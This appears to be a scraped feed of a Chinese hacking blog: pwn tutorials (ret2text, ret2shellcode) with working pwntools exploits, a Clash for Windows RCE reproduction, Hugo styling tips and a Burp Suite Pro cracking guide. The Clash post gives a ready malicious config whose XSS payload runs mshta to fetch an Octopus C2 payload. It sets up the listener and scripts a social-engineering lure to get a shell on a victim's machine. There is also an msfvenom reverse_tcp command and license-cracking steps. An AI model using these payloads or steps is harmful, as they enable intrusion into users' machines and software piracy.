然后用shellcraft.sh()函数获取ShellCode的汇编代码，再调用asm()变成机器码\nshellcode = asm(shellcraft.sh()) 网上找现成的ShellCode ShellStorm: 一个国外ShellCode集合\nShellStorm中包含多种平台，多种长度，多种功能的ShellCode\n为什么ShellCode会考虑长度？\n答: 有时候栈中填入的ShellCode有长度限制\n这里举个例子，只有8字节的ShellCode\n\u0026#34;\\x99\\x6a\\x0b\\x58\\x60\\x59\\xcd\\x80\u0026#34; metasploit 想要一个功能更强大且不想要网上到处找？\nMSF的meterpreter你绝对喜欢\n生成ShellCode命令\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\u0026lt;Local IP Address\u0026gt; LPORT=\u0026lt;Local Port\u0026gt; -f \u0026lt;language\u0026gt; 自己写 建议新手采用前几种方案，要是各位有兴趣自己写ShellCode的话可以参考这个PDF\nPWN! PWN! PANG? 本题思路和ret2text大体差不多，差别主要在返回地址上，ret2text是返回到text段的后门函数，而本次的ret2shellcode是返回到ShellCode\n大家可以先自己试试再看下面的思路分析.QwQ.\n大概先提几点提示:\nShellCode写入哪里呢？\nShellCode的地址是什么？\nret2shellcode 先checksec一下\n$ checksec ret2shellcode [*] \u0026#39;/home/pwn/桌面/ROP/ret2shellcode\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 看到这个32位程序NX是关闭的，而且有同时可以读，写，执行的段(也就是栈)，我们想到可以把ShellCode写入栈中，并通过栈溢出返回到栈中的ShellCode\n但是，我们貌似忽视了一个重要的问题\n目标机一般都是完全打开ASLR，也就意味着每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 我们无法通过反复试验来了解目标所在，因为每次的地址都会不同。\n因此，很显然我们并不能找到ShellCode的地址，也就没办法返回到栈上的ShellCode\n当然，如果各位想尝试一下上面的思路的话，直接将ASLR关闭即可\n该利用姿势ret2stack大家可以查看我朋友BlackRabbit的文章\n记得留个关注呐 .QwQ.\n反汇编分析 查看主函数反编译出的C代码\nint __cdecl main(int argc, const char **argv, const char **envp) { char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\u0026#34;No system for you this time !!!\u0026#34;); gets(s); strncpy(buf2, s, 0x64u); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 我们可以看出这里通过gets()读入了数组s,并把数组s的值传给了buf2，而这个buf2位于.bss节(看起来应该是一个全局变量)\n想到这里，我们不禁露出了恶毒的笑容\n我们在数组s中读入的shellcode会被程序同时放在buf2中，这样我们通过溢出数组s,把\nmain函数的返回地址覆盖成buf2的地址即可\nExploit 通过gdb调试该程序发现在返回地址前需数据112字节\ngdb调试在这里不再演示了，不会的可以查看上一篇文章\n但由于我们还需要写入ShellCode，我们必须选一个小于等于112字节的ShellCode,并把不足112字节的部分用垃圾数据填充\n由此写出EXP:\n# -*- coding: utf-8 -*- from pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;i386\u0026#39;) shellcode = asm(shellcraft.sh()) elf = ELF(\u0026#34;ret2shellcode\u0026#34;) io = process(\u0026#34;./ret2shellcode\u0026#34;) io.recvline() payload = shellcode.ljust(112,b\u0026#39;A\u0026#39;)+p32(elf.symbols[\u0026#34;buf2\u0026#34;]) #shellcode.ljust(112,b\u0026#39;A\u0026#39;)指shellcode不够112字节的地方用A填充 io.sendline(payload) io.interactive() Ref https://blog.csdn.net/weixin_43916678/article/details/107181228\nhttps://blog.csdn.net/qq_35495684/article/details/79583232\nhttps://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/\nhttps://www.bilibili.com/read/cv14181790\nhttps://blog.csdn.net/culinxia2707/article/details/108788113\n","date":"2022-03-03T05:50:08-05:00","image":"https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/cover_hu3166df2cafdca7684e1b9dcf3608c6c9_2294292_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/pwn-pwn-pang-part5---ret2shellcode/","title":"PWN! PWN! PANG! Part5 --- ret2shellcode"},{"content":"Clash For Windows RCE弹Shell 小白:RCE是什么\n大佬:Reliable Computer Engineering (可靠的电脑工程)\n咳咳，应该是Remote Code Execution(远程代码执行)= =\n免责声明 本文章为PGR的个人漏洞复现笔记，仅供参考/学习，如用文章中技术造成任何损失的后果自负\n前期准备 Tip:请使用一个Linux机器和一个Windows机器，否则可能会出现\u0026lt;意想不到\u0026gt;的问题\n(没有Linux? 去下载一个Kali Linux吧)\n一个有漏洞的Clash Windows 客户端 下载地址\n下载后按照提示在Windows系统下安装即可\nC2工具Octopus 在一个装好了Python3和Git的Linux系统执行以下的操作\n如果你没有安装，请参考\n安装Git\n安装Python3: 终端输入sudo apt install python3\n(由于大部分系统已经预装，如果你非deb系请自主上网搜索安装方式)\ngit clone https://github.com/mhaskar/Octopus.git cd Octopus pip install -r requirements.txt python3 octopus.py 成功安装后你会看到如下界面\n┌─[askar@hackbook]─[/opt/redteaming/Octopus] └──╼ $python3 octopus.py ___ ___ ___ ___ ___ ___ / /\\ / /\\ ___ / /\\ / /\\ /__/\\ / /\\ / /::\\ / /:/ / /\\ / /::\\ / /::\\ \\ \\:\\ / /:/_ / /:/\\:\\ / /:/ / /:/ / /:/\\:\\ / /:/\\:\\ \\ \\:\\ / /:/ /\\ / /:/ \\:\\ / /:/ ___ / /:/ / /:/ \\:\\ / /:/~/:/ ___ \\ \\:\\ / /:/ /::\\ /__/:/ \\__\\:\\ /__/:/ / /\\ / /::\\ /__/:/ \\__\\:\\ /__/:/ /:/ /__/\\ \\__\\:\\ /__/:/ /:/\\:\\ \\ \\:\\ / /:/ \\ \\:\\ / /:/ /__/:/\\:\\ \\ \\:\\ / /:/ \\ \\:\\/:/ \\ \\:\\ / /:/ \\ \\:\\/:/~/:/ \\ \\:\\ /:/ \\ \\:\\ /:/ \\__\\/ \\:\\ \\ \\:\\ /:/ \\ \\::/ \\ \\:\\ /:/ \\ \\::/ /:/ \\ \\:\\/:/ \\ \\:\\/:/ \\ \\:\\ \\ \\:\\/:/ \\ \\:\\ \\ \\:\\/:/ \\__\\/ /:/ \\ \\::/ \\ \\::/ \\__\\/ \\ \\::/ \\ \\:\\ \\ \\::/ /__/:/ \\__\\/ \\__\\/ \\__\\/ \\__\\/ \\__\\/ \\__\\/ v1.2 stable ! Octopus C2 | Control your shells Octopus \u0026gt;\u0026gt; 之后再运行只需要输入\npython3 octopus.py Apache2 deb系\nsudo apt install apache2 yum系\nsudo yum -y install httpd sudo firewall-cmd --permanent --add-port=80/tcp sudo firewall-cmd --permanent --add-port=443/tcp sudo firewall-cmd --reload 其他系统请参考官方网站\n漏洞复现 Linux(攻击机器) 在刚刚下好的Octopus目录下打开终端\n输入python3 octopus.py\n进入Octopus界面后输入如下内容\nlisten_http Linux的ip 5555 Linux的ip 5 随便起一个名字.php 名字 generate_hta 名字 面向想做Hacker的小白的提醒 (大佬们可以直接略过了)\n获取IP: 在终端输入ifconfig\n请不要傻瓜式抄命令，这里的ip/名字都是需要自己改的\n现在Octopus已经开始监听了QAQ,记下Octopus给出的链接，并把这个终端放一边 (别关掉)\n在Apache站点的默认目录/var/www/html/里放入我们的恶意配置文件，并命名为RCE.yaml\n命令如下:\nsudo vi RCE.yaml 写入如下内容\nport: 7890 socks-port: 7891 allow-lan: true mode: Rule log-level: info external-controller: :9090 proxies: - name: a\u0026lt;img/src=\u0026#34;1\u0026#34;/onerror=eval(\u0026#39;require(\u0026#34;child_process\u0026#34;).spawn(\u0026#34;mshta\u0026#34;,[\u0026#34;Octopus的链接(记住只需要一对双引号)\u0026#34;])\u0026#39;);\u0026gt; type: socks5 server: 127.0.0.1 port: \u0026#34;17938\u0026#34; skip-cert-verify: true - name: abc type: socks5 server: 127.0.0.1 port: \u0026#34;8088\u0026#34; skip-cert-verify: true proxy-groups: - name: \u0026lt;img/src=\u0026#34;1\u0026#34;/onerror=eval(\u0026#39;require(\u0026#34;child_process\u0026#34;).spawn(\u0026#34;mshta\u0026#34;,[\u0026#34;Octopus的链接\u0026#34;])\u0026#39;);\u0026gt; type: select proxies: - a\u0026lt;img/src=\u0026#34;1\u0026#34;/onerror=eval(\u0026#39;require(\u0026#34;child_process\u0026#34;).spawn(\u0026#34;mshta\u0026#34;,[\u0026#34;Octopus的链接\u0026#34;])\u0026#39;);\u0026gt; 原理：这是一个XSS漏洞，把payload放进Proxy的名字里，即可实现任意js代码执行，这里是执行指令mshta(命令) \u0026lt;Octopus生成的hta链接\u0026gt;(参数)\n按下Esc键并输入:wq保存并退出\n之后，攻击者就可以吃西瓜静等上线了\n诶嘿嘿= =\nWindows(某个可怜的小白的机器) PGR可是从来不欺负小白的哦 (坏笑)\n模拟社工过程：\nHacker: \u0026ldquo;需要白嫖Clash节点吗QAQ???\u0026rdquo;\n小白: \u0026ldquo;好啊\u0026rdquo;\nHacker: \u0026ldquo;这是你要的节点clash://install-config?url=xxx\u0026amp;name=RCE\u0026rdquo;\n咳咳，逃～～\n在Windows任意浏览器里输入\nclash://install-config?url=http://Linux的ip/RCE.yaml\u0026amp;name=名字 Tip:记得换IP和名字\n然后在弹出的提示点打开(Open)Clash For Windows\n进入Profiles页面\n选择你取的名字(这里是RCE).yaml\n切到Proxies页面并点击那个a(这一步不是必须的，因为这个RCE有些不稳定)\n成功GetShell (露出恶毒的笑容) Octopus收到了反弹的shell,可以 \u0026lt;为所欲为\u0026gt; 了\n输入interact 1即可在那台倒霉Windows上执行任意cmd指令啦.QWQ.\n漏洞防御 目前Clash官方已经发布了修复漏洞的最新版本\n下载链接\nRef https://github.com/Fndroid/clash_for_windows_pkg/issues/2710\nCompiling and Installing - Apache HTTP Server Version 2.4\nGitHub - mhaskar/Octopus: Open source pre-operation C2 server based on python and powershell\n","date":"2022-02-25T23:27:12-05:00","image":"https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/cover_hu12a48eb127ba99e3f348b4c7f466d0c6_650772_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/","title":"Clash猫猫RCE复现(弹shell)"},{"content":"PWN! PWN! PANG! Part4 必须有的前言 从Part4开始我们就要正式进入实战部分了哦qaq,\n本篇文章主要讲述最最简单的一种栈溢出利用姿势ret2text\n资料投放\u0026gt;__\u0026lt; IDA Pro 7.5\nret2text题目\nP.S. 这里安利一下OneDrive云盘优秀的分享功能，速度快且可以脱离客户端\n补充知识点：Linux程序安全保护机制 ASLR: 地址随机化技术 全名: Address Space Layout Randomization\n系统的保护措施, 和程序没有关系, 一般默认目标机器随机化完全开启\n每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 攻击者无法通过反复试验来了解目标所在，因为每次的地址都会不同。\n可以通过cat /proc/sys/kernel/randomize_va_space查看系统保护的开启情况\nASLR选项:\n0 关闭\n1 半随机 共享库 栈 mmap()分配的堆空间以及VDSO将被随机化\n2 全随机 brk()分配的堆空间也被虚拟化\nPIE: 随机化ELF文件映射地址 好饿，想吃馅饼了 雾)\n全名: Position-Independent Executable\n程序的防护措施，编译时生效\n检测程序防护措施的方法:PWNTools的checksec模块\n详细使用技巧见下文\n开启 ASLR 之后，PIE 才会生效 The NX bits(NX): 栈不可执行 栈为什么要不可执行呢? 小问号你是否有很多小朋友???\n从前面的知识中可以了解到，攻击者可以通过栈溢出劫持程序执行流，强迫程序执行制定地址的内容\n而如果恰好攻击者在栈中写入了shellcode(指执行后可以直接拿到shell的代码)，就可以通过直接执行栈中写入的shellcode来getshell\n所以，为了防范攻击者这么轻易就能做坏事= = The NX bits就诞生了\n全名: the No-eXecute bits\n程序与操作系统的防护措施，编译时决定是否生效(也就意味着可以通过checksec查看)，由操作系统实现\n实现: 通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃\nCanary (金丝雀) : 专门针对栈溢出的防护 程序的防护措施，编译时生效\n基本上Canary开启我们就不采用栈溢出的思路\n实现:在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的\ncanary长度为1字长，其位置不一定与ebp/rbp存储的位置相邻，具体得看程序的汇编操作\nRELRO: 重定位信息不可写 全名: RELocate Read-Only\n程序的防护措施，编译时生效\n分为关闭RELRO，部分RELRO(目前是gcc默认), 完全RELRO\n在本系列文章中不讲解，如果有兴趣可以去看这篇文章\nPWN? PWN! PANG! 前期准备 下载好所需文件(IDA, 目标程序ret2text)\n在ret2text相同目录下打开终端\n准备好一个Windows系统\n确保ret2text文件可以执行\nll chmod +x ret2text 查看保护开启情况 checksec ret2text 至于checksec用法嘛= = checksec 文件名\n结果\n[*] \u0026#39;/home/kali/Sec/PWN/Stack/ret2text\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看见这是一个32位程序，开启了NX\n反汇编分析 因为IDA是win平台的，所以我们就得先请出一只无辜的Windows\n将ret2text拖到 ida.exe 上打开\n如果是64位程序，则选择 ida64.exe\n同意使用协议\n选择第一个(默认配置)然后ok\n双击左栏main进入主函数\nTIP: 如你界面和我不相同请按空格键切换\n汇编看着太难受了? 按下F5即可看到c代码\nTip: 别忘了Fn键哦.qaq\n思路分析 int __cdecl main(int argc, const char **argv, const char **envp) { setbuf(stdin, 0); setbuf(stdout, 0); puts(\u0026#34;Have you heard of buffer overflow?\u0026#34;); vulnerable(); puts(\u0026#34;It seems that you know nothing about it ......\u0026#34;); return 0; } 我们看到它调用了一个vulnerable函数 (这也太明显了吧 = = )\n查看那个 欠揍的函数 代码，可以看见明显的一个漏洞\nint vulnerable() { char buffer[8]; // [esp+8h] [ebp-10h] BYREF gets(buffer); return 0; } 它使用gets()读入局部变量buffer[8],由于gets()不检查输入长度，所以就可以读入过长数据造成栈溢出\n仔细观察左侧函数列表，get_shell()引起了我们的注意\nint get_shell() { system(\u0026#34;/bin/sh\u0026#34;); return 0; } 好家伙，直接双手呈上shell= =,\n这看起来是某个程序员为了方便自己 奇奇怪怪的意图 调试程序干的\u0026lt;好\u0026gt;事, 在程序了直接留下一个后门\n现在我们的思路应该很清晰了，就是通过栈溢出篡改函数返回地址，劫持程序执行流，让其调用get_shell()\n精心构造恶意数据 既然要溢出，那么我们要溢出多少才可以呢？\n观察上面的图片,我们可以发现，我们首先要用垃圾数据把局部变量空间(因具体情况而定)和prev ebp的空间(32位4字节.64位8字节)填满，然后再加上get_shell()的地址覆盖返回地址\n计算所需垃圾数据长度方法\n通过IDA的注释获取(不一定准确) 在IDA对于受害者函数的反编译代码中，有这样一句\nchar buffer[8]; // [esp+8h] [ebp-10h] BYREF 可以看到buffer[8]距离prev ebp有16字节的距离，由于我们还需填充prev ebp,我们还要填充4字节的垃圾数据，一共20字节垃圾数据\n通过pwndbg动态调试 gdb ret2text 由于我们要溢出的地方在函数vulnerable(),我们直接在那个地方打断点\nb vulnerable 现在开始调试该程序\nr 一直下一步直到输入(虽说本次只需要一次)\nn 输入8个A测试一下\n输入stack 大小(这个大小随意，最好大一些) 查看栈的情况\nstack 40 结果\npwndbg\u0026gt; stack 40 00:0000│ esp 0xffffd070 ◂— 0x1 01:0004│ 0xffffd074 —▸ 0x80483e0 (_start) ◂— xor ebp, ebp 02:0008│ eax 0xffffd078 ◂— \u0026#39;AAAAAAAA\u0026#39; 03:000c│ 0xffffd07c ◂— \u0026#39;AAAA\u0026#39; 04:0010│ 0xffffd080 —▸ 0x8048600 (__libc_csu_init+32) ◂— dec dword ptr [ebp - 0xfb7d] 05:0014│ 0xffffd084 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1 06:0018│ ebp 0xffffd088 —▸ 0xffffd098 ◂— 0x0 07:001c│ 0xffffd08c —▸ 0x80485ae (main+93) ◂— sub esp, 0xc 08:0020│ 0xffffd090 —▸ 0xffffd0b0 ◂— 0x1 09:0024│ 0xffffd094 ◂— 0x0 0a:0028│ 0xffffd098 ◂— 0x0 0b:002c│ 0xffffd09c —▸ 0xf7dd9905 (__libc_start_main+229) ◂— add esp, 0x10 0c:0030│ 0xffffd0a0 ◂— 0x1 可以看到A们在地址0xffffd078,而prev ebp的地址是0xffffd088\nTip: 0x表示16进制\n为什么计算机中的东西是用二进制表示的，这里显示16进制呢？\n那是因为二进制串实在太长了，不方便查看(0b11111111111111111101000001111000) = =\n由于前面一长串f都是一样的，我们只需要计算 0x88-0x78+0x4 就可以了(加上0x4是因为要填充 prev ebp\n再来个Tip: 每种地址都有一定特点\n比如说: 栈里的地址都很大，一边都是0xffff\u0026hellip;\n所以共填充20字节垃圾数据\n获取get_shell()地址\n从IDA里找 点击左侧函数列表里的函数，然后复制右侧窗口里的那个值\nTip: IDA是个懒家伙，那个值默认是16进制，但它没有加上前缀0x, 使用这个值的时候自行加上\n利用PWNTools 别忘了python导入模块\n┌──(kira㉿kali)-[~/Sec/PWN/Stack] └─$ python Python 3.9.10 (main, Jan 16 2022, 17:12:18) [GCC 11.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; from pwn import * 加载该ELF文件信息\nelf=ELF(\u0026#34;ret2text\u0026#34;) 寻找get_shell()函数地址\nget_shell = elf.symbols[\u0026#34;get_shell\u0026#34;] 现在，get_shell变量就保存着get_shell()函数地址了\nExploit! 呼～终于到了攻击的时候\n攻击前，先运行程序试一试\n./ret2text 输入可以随便写点什么(我这里写一个A)\n┌──(kira㉿kali)-[~/Sec/PWN/Stack] └─$ ./ret2text Have you heard of buffer overflow? A It seems that you know nothing about it ...... 嘛。。这小程序说我们不会缓冲区溢出。。现在就证明给它看我们会！（\n先建一个攻击脚本\nvi exp_ret2text.py 第一件事情嘛= =，当然是导入pwntools模块\nfrom pwn import * 然后就是基本操作\nio = process(\u0026#34;./ret2text\u0026#34;) io.recvline() 构造payload(要输入的东西，也就是垃圾数据和我们想要程序返回的地址)\n如果你用IDA取地址(不建议)\npayload = b\u0026#39;A\u0026#39;*20 + p32(0x08048522) 如果你用pwntools取地址(你可以直接在编写脚本的时候取地址)\nelf=ELF(\u0026#34;ret2text\u0026#34;) get_shell = elf.symbol[\u0026#34;get_shell\u0026#34;] payload = b\u0026#39;A\u0026#39;*20 + p32(get_shell) 最后，把恶意数据喂给程序 唔哈哈哈哈;)\n就能尽情享用得到的shell了\nio.sendline(payload) io.interactive() 运行攻击脚本 python3 exp_ret2text.py 过程展示\n┌──(kira㉿kali)-[~/Sec/PWN/Stack] └─$ python3 exp_ret2text.py [+] Starting local process \u0026#39;./ret2text\u0026#39;: pid 897972 [*] \u0026#39;/home/kali/Sec/PWN/Stack/ret2text\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [*] Switching to interactive mode $ ls exp_ret2text.py pwndbg ret2libc1 ret2libc2 ret2text $ whoami kira EXP from pwn import * # 运行这个本地程序 io = process(\u0026#34;./ret2text\u0026#34;) # 接收输出 io.recvline() # payload = b\u0026#39;A\u0026#39;*20 + p32(0x08048522) # 不建议使用IDA去获得地址，因为嘛= =还是尽可能用代码操作 elf=ELF(\u0026#34;ret2text\u0026#34;) # 读取文件的信息 get_shell = elf.symbols[\u0026#34;get_shell\u0026#34;] # 搜索\u0026#34;符号\u0026#34;get_shell payload = b\u0026#39;A\u0026#39;*20 + p32(get_shell) io.sendline(payload) #投喂数据(虽说是恶意数据) io.interactive() #切换到交互模式 Ref https://blog.csdn.net/weixin_43833642/article/details/104175028\nhttps://blog.csdn.net/weixin_44932880/article/details/104092620\n二进制漏洞挖掘之栈溢出-开启RELRO_ylcangel的专栏-CSDN博客_partial relro\nTo Be Continued .qaq.\n","date":"2022-02-10T22:54:20-05:00","image":"https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/cover_hudfa7423162da6f5e14fd4e8a1ac3231a_749576_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/pwn-pwn-pang-part4---ret2text/","title":"PWN! PWN! PANG! Part4 --- ret2text"},{"content":"嘛。。。= = 这是一个留言板 嘿嘿，小伙伴们可以在下面评论区畅所欲言哦\n大家可以给我留言，求资源，交流技术，在这里交朋友\n甚至可以贴广告\n咳咳，当然是非盈利性的那种= = 我们是开源主义者XD\nPS:如果我博客的文章内容有什么技术上的错误的话烦请各位dalao指正哦.qaq.\n","date":"2022-02-10T07:54:34-05:00","image":"https://blog.nanosec.site/p/%E7%95%99%E8%A8%80%E6%9D%BF/cover_hu5f7bc17f5f2e97a59ee242b3c0f2a5d9_113875_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/%E7%95%99%E8%A8%80%E6%9D%BF/","title":"留言板"},{"content":"Hugo Stack 简单美化/配置 前言 本篇文章主要是说说几个我在搭建博客的时候采用的几种美化/配置方式，\n如大家有其他需求的话，可以去康康文末几个参考链接\n分类部分加上缩略图 在你网站根目录(术语不理解的话看上一篇文章)打开终端/cmd/其他命令行工具，\n并输入\nhugo new categories/分类名字/_index.md 注意: index前面下划线不能少\n然后修改_index.md成下面这种样子\n--- title: \u0026#34;分类名\u0026#34; date: 2022-02-08T01:03:14-05:00 image: 你的图片名(带后缀) style: background: \u0026#34;#2a9d8f\u0026#34; color: \u0026#34;#fff\u0026#34; --- 注意: 请把图片和_index.md放在同一目录里\n代码:给你点Color See See 咳咳，关于代码框框着色问题= =\n只需要指明代码类型是可以着色的qaq\n文本特效 在网站根目录/layouts/partials内新建一个文件夹head\n没有的话就不用建哦awa 再建一个custom.html 在其中输入以下代码\n\u0026lt;head\u0026gt; \u0026lt;style\u0026gt; .blur { color: transparent; text-shadow:0px 0px 8px rgba(0,0,0,0.5) } .blur:hover { color: transparent; text-shadow:0px 0px 0px rgba(0,0,0,1) } .shady { color:#000; font-weight: bold; box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; transition: all 0.3s ease; } .shady:hover{ font-weight: bold; color:#FFF; box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; 还有，由于你要在MarkDown中内嵌html代码，你需要修改一下配置文件(网站根目录下的config.yaml)\n倒数第7行改为\nunsafe: true 高斯模糊 在你的文章中直接输入\n\u0026lt;span class=\u0026#34;blur\u0026#34;\u0026gt;是高斯模糊呐~ \u0026lt;/span\u0026gt; 效果:\n是高斯模糊呐\n黑幕效果 在你的文章中直接输入\n\u0026lt;span class=\u0026#34;shady\u0026#34;\u0026gt;诶嘿嘿，我藏好了哦\u0026lt;/span\u0026gt; 效果\n诶嘿嘿，我藏好了哦\n坑 这样一搞的话回车键/Tab的换行就完蛋了= =, 可以用\u0026lt;br\u0026gt;放在行末尾来换行\n\u0026lt;span class=\u0026#34;blur\u0026#34;\u0026gt;行1 \u0026lt;br\u0026gt; 行2 \u0026lt;br\u0026gt; 行3\u0026lt;/span\u0026gt; 效果\n行1 行2 行3\n还有，你不可以将特效和MarkDown基础/特殊语法叠加使用\n## 因为它没用= = 即答)\n别打我 逃)\n彩色丝带背景 在网站根目录/layouts/partials/footer/下新建一个custom.html\n在里面写入如下代码\n\u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js\u0026#34; integrity=\u0026#34;sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; size=\u0026#34;300\u0026#34; alpha=\u0026#34;0.6\u0026#34; zindex=\u0026#34;-1\u0026#34; defer \u0026gt;\u0026lt;/script\u0026gt; 天女散花..? 博客酱页面太单调了？我们来丰富一下它吧\n在网站根目录/static/js里新建一个snow.js\n(如果没有目录的话自己新建)\nsnow.js代码\n;(function () { const Config = { snow: [\u0026#39;❄\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;※\u0026#39;, \u0026#39;⛄\u0026#39;, \u0026#39;☃\u0026#39;, \u0026#39;🎄\u0026#39;, ], // 雪花的样式，可以放不同的雪花，或者任何 emoji，每次生成新雪花时会随机挑选其中一个 color: \u0026#39;#d9e2e7\u0026#39;, // 雪的颜色 speed: 10, // 雪花从生成到落到最底端所经历的时间，单位是秒。数字越小落得越快 dom: document.getElementsByTagName(\u0026#39;body\u0026#39;)[0], // 下雪的区域，可以保持不变，这样就是全屏下雪 interval: 800 // 生成一片雪花的时间间隔，单位是毫秒 } if (!Config.dom) { throw Error(\u0026#39;错误提示\u0026#39;) } const $canvas = document.createElement(\u0026#39;div\u0026#39;) useStyle($canvas, { width: \u0026#39;100%\u0026#39;, height: \u0026#39;100%\u0026#39;, position: \u0026#39;fixed\u0026#39;, top: 0, left: 0, pointerEvents: \u0026#39;none\u0026#39;, zIndex: 100 }) setInterval(() =\u0026gt; { const $snow = document.createElement(\u0026#39;div\u0026#39;) $snow.innerText = Config.snow[rand(0, Config.snow.length - 1)] useStyle($snow, { display: \u0026#39;inline-block\u0026#39;, color: Config.color, fontSize: rand(14, 25) + \u0026#39;px\u0026#39;, position: \u0026#39;absolute\u0026#39;, top: 0, left: rand(0, 100) + \u0026#39;%\u0026#39;, transition: \u0026#39;transform \u0026#39; + Config.speed + \u0026#39;s linear\u0026#39; + \u0026#39;,opacity \u0026#39; + Config.speed + \u0026#39;s linear\u0026#39;, transform: \u0026#39;translateY(-100%)\u0026#39;, opacity: Math.random() + 0.3 }) setTimeout(() =\u0026gt; { useStyle($snow, { transform: \u0026#39;translate(0, \u0026#39; + getComputedStyle($canvas).height + \u0026#39;) rotate(480deg)\u0026#39;, opacity: 0 }) $snow.addEventListener(\u0026#39;transitionend\u0026#39;, () =\u0026gt; { $snow.remove() }) }, 100) $canvas.appendChild($snow) }, Config.interval) function rand (from, to) { return from + Math.floor(Math.random() * (to - from + 1)) } function useStyle (dom, style) { for (let sKey in style) { dom.style[sKey] = style[sKey] } } Config.dom.appendChild($canvas) })() 再在网站根目录/layouts/partials/footer/下新建一个custom.html\n如果已经有了这个文件可以直接在之前的代码后面追加\n在里面写入如下代码\n\u0026lt;script src=\u0026#34;/js/snow.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; Linux下搞不了emoji?\n最简单的方式Ctrl C V\n左侧快捷菜单自定义 修改网站更目录下配置文件config.yaml即可\n去到menu这边(176行?)\n利用以下格式添加/修改\n- identifier: 名字 name: 名字 url: /posts/ ### Url里填要跳转的目录，注意这里/表示 网站根目录/content weight: 300 ### weight是一个整数(最好填正数罢)数越大菜单项越在下面 params: icon: infinity ### icon(图标)位于网站根目录/themes/hugo-theme-stack/assets/icons/，输入不带后缀的文件名，当然你也可以自己添加图标 newTab: false ### newTab为true时点击会打开新标签页 Ref https://mantyke.icu/2022/stack-theme-furnish03/\nHugo |另一篇Stack主题装修记录\n","date":"2022-02-09T04:35:37-05:00","image":"https://blog.nanosec.site/p/hugo-stack%E4%B8%BB%E9%A2%98%E7%AE%80%E5%8D%95%E7%BE%8E%E5%8C%96/cover_hu81032a5d4f0a887010a47d971b45af85_853501_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.nanosec.site/p/hugo-stack%E4%B8%BB%E9%A2%98%E7%AE%80%E5%8D%95%E7%BE%8E%E5%8C%96/","title":"Hugo Stack主题简单美化"},{"content":"Burp Suite Professional 安装+破解教程 嗝~~\n(Burp在英文中有打嗝的意思)\n前言 咳咳，先声明一下，当你看到这篇文章的时候，它很可能已经是 过时 的了= =,\n由于Burp会不断更新换代，本文章提供的软件安装包不可能提供最新安装包，如果你觉得版本太旧了，请自行网上搜索最新安装包，但文章提供的破解工具 应该 能保证在之后一段时间内有用\n资源 破解工具\nBurp Suite Pro v2022.1\n使用 JAVA环境 运行Burp Suite Professional需要提前安装好java环境\nWindows Java下载\nLinux\ndeb系\nsudo apt install default-jdk Red Hat\nsudo yum install java-版本号-openjdk-devel Linux Java下载\n嗝～～开始破解 注意：请把Burp的文件和破解工具放入同一个文件夹\n终端/cmd/你奇奇怪怪的命令行工具进入放有以上两个文件的目录\n先运行破解工具\njava -jar burploader.jar 这里License Text随便填一些东西(这些东西之后会显示在你的Burp标题栏上，可以考虑搞些酷酷的东西)\nTIP: 如果你是JAVA 17+, 记得不要直接点旁边的RUN(要不然会报错)\nJAVA17+的看这里\n保留破解工具窗口，并终端输入\njava -noverify -javaagent:burploader.jar --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -jar burpsuite_pro_v2022.1.jar 如果你是其他JAVA版本，Burp启动后提示你要加上xxx的JVM参数，参考以下命令格式\njava -noverify -javaagent:burploader.jar 提示你要加上的参数 -jar burpsuite_pro_v2022.1.jar 把破解工具生成的Liscense(许可证)粘贴进Burp的许可证框框= =\nTIP:你在使用快捷键复制粘贴的时候一定要注意无论你是什么系统快捷键都是Ctrl + C/V\n点击Next(下一步)后选择Manual Activation(人工激活)\n然后把Burp的Request复制粘贴进激活工具\n傻瓜教程：点击旁边的Copy Request按钮复制，然后粘贴 **进激活工具Request框\n然后把激活工具的Response(回复)复制粘贴进Burp的Response框\n然后不BUG的话就应该激活成功了.qwq.\nTIP:在实际情况下要是点paste 